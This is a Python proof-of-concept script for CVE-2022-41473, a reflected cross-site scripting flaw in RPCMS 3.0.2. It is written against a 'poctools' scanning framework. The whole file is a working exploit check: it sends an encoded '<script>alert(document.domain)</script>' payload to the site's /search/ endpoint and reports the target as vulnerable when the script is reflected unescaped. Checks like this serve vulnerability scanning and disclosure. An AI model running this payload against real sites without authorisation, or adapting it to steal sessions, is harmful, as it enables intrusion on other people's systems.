# title: RPCMS 3.0.2 - Cross-Site Scripting CVE-2022-41473
# author: antx
# cveid: CVE-2022-41473

from poctools import BasicPoc


class APoc(BasicPoc):

    def __init__(self):
        super(APoc, self).__init__()
        self.name = 'A-Poc'

    def verify(self, url: str):
        url = url.rstrip("/")
        target = f'{url}/search/?q=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
        try:
            resp = self.get(target)
            if resp.status_code == 200 and 'text/html' in str(resp.headers) and '<script>alert(document.domain)</script>' in resp.text and 'rpcms' in resp.text:
                return True
        except Exception as e:
            pass
        return False


if __name__ == '__main__':
    target = 'http://127.0.0.1'
    tp = APoc()
    result = tp.run(url=target)
    print(f'{target} -> {result}')
